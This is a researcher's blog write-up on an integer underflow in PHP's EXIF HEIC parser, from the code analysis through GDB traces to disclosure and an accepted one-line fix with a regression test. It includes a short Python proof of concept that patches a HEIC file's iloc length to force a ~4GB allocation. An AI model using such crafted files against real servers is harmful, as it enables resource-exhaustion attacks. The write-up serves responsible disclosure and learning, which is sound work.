---
title: "Finding an Integer Underflow in PHP's HEIC Parser"
date: 2025-12-02
tags: ["IntegerUnderflow", "PHP", "MemorySafety", "HEIF", "OpenSource"]
---

## TL;DR

I found an integer underflow in PHP's EXIF extension that triggers a ~4GB memory allocation when parsing malicious HEIC files. Reported it, maintainers said it's not a security issue but accepted the hardening fix. Here's the full story

## Background

I was looking for targets to audit and decided to dig into PHP's source code. PHP powers a huge chunk of the web, so any bug there has massive impact potential. I focused on binary parsing code since that's where memory safety bugs usually hide

The EXIF extension caught my attention , it parses image metadata from JPEG, TIFF, and HEIF/HEIC files. HEIC is Apple's default image format, so any PHP app accepting iOS photo uploads is processing these files

```bash
git clone https://github.com/php/php-src.git
cd php-src
```

The EXIF extension lives in `ext/exif/exif.c` - a 165KB, ~5000 line monster of a file. Perfect hunting ground

## Finding the Bug

I started grepping for integer operations near memory allocations:


After some digging, I found `exif_scan_HEIF_header()` , the function that parses HEIF/HEIC files. Here's the vulnerable code at lines 4424-4433:

```c
if ((pos.size) &&
    (pos.size < ImageInfo->FileSize) &&
    (ImageInfo->FileSize - pos.size >= pos.offset) &&
    (php_stream_seek(ImageInfo->infile, pos.offset + 2, SEEK_SET) >= 0)) {
    if (limit >= pos.size - 2) {
        limit = pos.size - 2;
    } else {
        limit = pos.size - 2;
        efree(data);
        data = (unsigned char *)emalloc(limit);  // <- bug here
    }
```

See the problem? `pos.size - 2` with no minimum check. If `pos.size` is 1:

```bash
pos.size - 2 = 1 - 2 = 0xFFFFFFFF (4294967295)
```

Since `limit` is `size_t` (unsigned), it wraps around to ~4GB. Then `emalloc()` tries to allocate 4 gigabytes of memory. Boom.

The `pos.size` value comes directly from the HEIF file's iloc box , attacker controlled input with no validation:

```c
// ext/exif/exif.c:4371-4372
pos->offset = php_ifd_get32u(p + 8, 1);
pos->size = php_ifd_get32u(p + 12, 1);  // no minimum check
```

## Setting Up the Environment

First, I built PHP with AddressSanitizer and debug symbols:

```bash
cd php-src
./buildconf --force
CC=gcc CXX=g++ CFLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
LDFLAGS="-fsanitize=address,undefined" \
./configure --enable-exif --enable-debug --disable-all
make -j$(nproc)
```

Build successful. Time to create a PoC.

## Writing the PoC

I needed a valid HEIC file to patch. PHP's test suite has one:

```bash
cp ext/exif/tests/image029.heic poc.heic
```

First, I found where the iloc extent_length field lives:

<img width="883" height="132" alt="521047026-4f8edd77-49d2-44b7-80d3-6fa9e62cd3b6" src="https://github.com/user-attachments/assets/d3cd954a-c230-4331-b984-8359474b3ddc" />



```bash
$ xxd -s 0x4f0 -l 16 poc.heic
000004f0: 0000 0001 0000 051c 0000 09ce 0007 0000
                              ^^^^^^^^^ extent_length = 0x09ce (2510)
```

The extent_length is at offset 0x4f8. I wrote a simple Python script to patch it:

```python
# patch_heic.py
with open('poc.heic', 'rb') as f:
    data = bytearray(f.read())

# offset 0x4f8: change extent_length from 0x09ce to 0x01
data[0x4f8:0x4fc] = b'\x00\x00\x00\x01'

with open('poc_underflow.heic', 'wb') as f:
    f.write(data)
```

Why this works: when extent_length = 1, `pos.size` becomes 1. Then `pos.size - 2` causes unsigned integer underflow: `1 - 2 = 0xFFFFFFFF`.

## Triggering the Bug

<img width="1900" height="355" alt="521047425-94a8a852-b4a2-47cc-93a2-f221de68d810" src="https://github.com/user-attachments/assets/b8854db8-bf57-4cb9-9029-06b53be50920" />


```bash
$ php -d memory_limit=128M -r "exif_read_data('poc_underflow.heic');"

Fatal error: Allowed memory size of 134217728 bytes exhausted at
ext/exif/exif.c:4433 (tried to allocate 4294967295 bytes)
```

4,294,967,295 bytes. That's the underflowed value.

## Verifying with strace

I wanted syscall-level proof:

```bash
$ strace -e mmap php -d memory_limit=8G -r "exif_read_data('poc_underflow.heic');"

mmap(NULL, 4294967296, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0381200000
```

<img width="1362" height="786" alt="521047683-e399b588-90e6-420e-b669-d3f3eedf33c5" src="https://github.com/user-attachments/assets/d0bb2a54-b2f5-4eeb-9711-55104acc7a2f" />

4GB mmap. The kernel actually allocated it because I set memory_limit high enough. Definitive proof.

## GDB Deep Dive

Time to catch the exact moment of underflow. I loaded the PoC in GDB with pwndbg:

```bash
$ gdb -q php-src/sapi/cli/php
(gdb) set args -d memory_limit=-1 -r "exif_read_data('poc_underflow.heic');"
(gdb) break exif.c:4428
(gdb) break exif.c:4433
(gdb) run
```

### Breakpoint 1: The Underflow Moment

<img width="1507" height="863" alt="521048924-0cf50a76-5a4c-41a0-a79d-d1558837e29f" src="https://github.com/user-attachments/assets/60220006-3f82-4bf7-8031-f81574ad8689" />

```bash
pwndbg> print pos
$1 = {offset = 1308, size = 1}

pwndbg> print pos.size
$2 = 1

pwndbg> print pos.size - 2
$3 = 4294967295

pwndbg> print limit
$4 = 1260
```

There it is. `pos.size = 1` from our patched iloc box. The subtraction wraps to 0xFFFFFFFF.

### Breakpoint 2: Before emalloc()

<img width="686" height="677" alt="521049472-0dfa5ea8-e874-42c8-8be9-f535f3254f6a" src="https://github.com/user-attachments/assets/74077269-86db-4876-bbdd-8702db05fb18" />


```bash
pwndbg> print limit
$5 = 4294967295

pwndbg> print/x limit
$6 = 0xffffffff
```

The underflowed value is now in `limit`, about to be passed to emalloc().

### Register State at emalloc() Call

<img width="1798" height="571" alt="521050087-fe551ef6-7dc0-4118-ab8f-365600ad6c44" src="https://github.com/user-attachments/assets/4ca23f96-7bc0-496a-8ee3-2cf5293a2b27" />


```bash
─────────────────────────────[ DISASM ]─────────────────────────────
   0x555558cb7dc5 <+2209>    mov    rdi, rax    RDI => 0xffffffff
   0x555558cb7dc8 <+2212>    call   _emalloc

pwndbg> info registers rdi rax
rdi    0xffffffff    4294967295
rax    0xffffffff    4294967295
```

<img width="1895" height="233" alt="521051289-4d5f053a-97f5-4a71-be65-e13af3e84f01" src="https://github.com/user-attachments/assets/0a8c9701-9273-4834-ad8f-7e656101c84f" />


RDI holds the first argument to `_emalloc()`. The value 0xFFFFFFFF (4294967295) is the allocation size - approximately 4GB. This is the smoking gun.

## The Disclosure

I submitted a security advisory to php/php-src on GitHub with full details: vulnerable code, PoC, GDB traces, and a suggested fix.

The maintainer (ndossche) responded:

> "The underflow indeed still happens, but the server does not go down with it: only that particular web request ends. This is conceptually similar to a user sending a large amount of data to an application that results in large memory usage, causing a request to end. Neither of those are security issues."

Fair point. PHP's memory_limit catches it before full allocation, and PHP-FPM isolates requests. The underflow is a bug, but not a traditional security boundary violation.

I agreed and offered to submit a hardening fix anyway:

> "if you're open to accepting this as a hardening fix, i'd be happy to open a PR with the pos.size >= 2 check. just let me know!"

They said yes.

## The Fix

One-line change in `ext/exif/exif.c`:

```c
// BEFORE (vulnerable)
if ((pos.size) &&

// AFTER (fixed)  
if ((pos.size >= 2) &&
```

This ensures `pos.size - 2` never underflows since `pos.size` is guaranteed to be at least 2.

I also added a regression test (`ext/exif/tests/heic_iloc_underflow.phpt`) that patches a valid HEIC to trigger the bug and verifies the fix handles it gracefully.

`ext/exif/tests/heic_iloc_underflow.phpt`

```php
--TEST--
HEIC iloc extent_length underflow
--EXTENSIONS--
exif
--FILE--
<?php
// Read valid HEIC file and patch iloc extent_length to 1
$data = file_get_contents(__DIR__."/image029.heic");
$data = substr_replace($data, "\x00\x00\x00\x01", 0x4f8, 4);
file_put_contents(__DIR__."/heic_iloc_underflow.heic", $data);
var_dump(exif_read_data(__DIR__."/heic_iloc_underflow.heic"));
?>
--CLEAN--
<?php
@unlink(__DIR__."/heic_iloc_underflow.heic");
?>
--EXPECTF--
Warning: exif_read_data(heic_iloc_underflow.heic): Invalid HEIF file in %s on line %d
bool(false)
```


## PR Accepted

<img width="981" height="922" alt="image" src="https://github.com/user-attachments/assets/53be3ba5-f683-47b9-ab1e-d9e2ef9e647f" />


The maintainer reviewed and approved:

> "Thanks! For the future, this should actually target the PHP-8.5 branch. That's because bugfixes always should target the lowest supported branch and we will merge upwards. Doesn't matter now as I'll just cherry-pick into the right branch."

Lesson learned for next time.

## Conclusion

Not every bug is a CVE. This integer underflow causes a ~4GB allocation attempt, but PHP's memory_limit prevents actual exploitation in most configurations. The maintainers were right that it doesn't cross security boundaries.

But here's the thing , the bug is real, the code is cleaner now, and I learned a lot:

- How PHP's HEIF/HEIC parsing works
- ISO Base Media File Format (iloc boxes, etc.)
- How to contribute to a massive open source project
- When to accept "not a security issue" gracefully

Sometimes the win isn't a CVE , it's getting a fix merged and learning how major open source projects handle security reports

**Status:** PR #20630 approved, pending merge.

---

**Timeline:**

- December 1, 2025: Vulnerability discovered
- December 1, 2025: Security advisory submitted
- December 2, 2025: Maintainer response - "not a security issue"
- December 2, 2025: Agreed, offered hardening fix
- December 2, 2025: PR #20630 opened with fix + test
- December 2, 2025: PR approved

**Affected versions:** PHP 8.3.0+ (HEIF support added in 8.3)

**Fix:** [PR #20630](https://github.com/php/php-src/pull/20630)

---
*Interested in security research? Check out my other writeups.*
